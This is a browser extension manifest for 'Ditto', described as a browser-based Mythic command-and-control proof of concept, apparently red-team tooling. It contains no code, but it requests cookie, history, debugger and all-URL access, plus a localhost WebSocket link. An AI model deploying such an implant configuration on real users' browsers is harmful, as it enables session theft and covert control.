{
  "manifest_version": 3,
  "name": "Ditto",
  "version": "%%EXTENSION_VERSION%%",
  "description": "Browser-based Mythic C2 proof of concept.",
  "permissions": [
    "alarms",
    "tabs",
    "cookies",
    "history",
    "management",
    "storage",
    "debugger",
    "activeTab"
  ],
  "host_permissions": [
    "<all_urls>",
    "ws://127.0.0.1/*",
    "ws://localhost/*"
  ],
  "background": {
    "service_worker": "service_worker.js"
  },
  "externally_connectable": {
    "matches": [
      "isolated-app://*/*"
    ]
  }
}
